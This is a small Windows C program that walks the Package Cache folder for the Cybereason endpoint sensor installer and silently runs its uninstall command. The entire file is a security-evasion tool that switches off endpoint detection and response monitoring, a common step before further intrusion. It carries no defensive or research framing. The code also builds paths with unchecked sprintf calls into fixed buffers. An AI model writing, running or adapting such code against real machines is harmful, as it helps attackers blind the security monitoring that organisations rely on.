#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <shlwapi.h>
#pragma warning(disable:4996)
#define _CRT_SECURE_NO_WARNINGS

void uninstallFile(const char* filePath) {
    char command[MAX_PATH + 50]; 
    sprintf(command, "\"%s\" /uninstall /quiet", filePath);
    system(command);
}

void searchAndUninstallFile(const char* directory, const char* fileName) {
    char searchPattern[MAX_PATH];
    sprintf(searchPattern, "%s\\*.*", directory);

    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(searchPattern, &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
                    char subDirectory[MAX_PATH];
                    sprintf(subDirectory, "%s\\%s", directory, findData.cFileName);
                    searchAndUninstallFile(subDirectory, fileName);
                }
            }
            else {
                if (strcmp(findData.cFileName, fileName) == 0) {
                    char filePath[MAX_PATH];
                    sprintf(filePath, "%s\\%s", directory, findData.cFileName);
                    printf("Dosya bulundu: %s\n", filePath);
                    uninstallFile(filePath);
                    return;
                }
            }
        } while (FindNextFileA(hFind, &findData));
        FindClose(hFind);
    }
}

int main() {
   const char* directoryPath = "C:\\ProgramData\\Package Cache";
    const char* fileName = "CybereasonSensor.exe";

    searchAndUninstallFile(directoryPath, fileName);

    return 0;
}
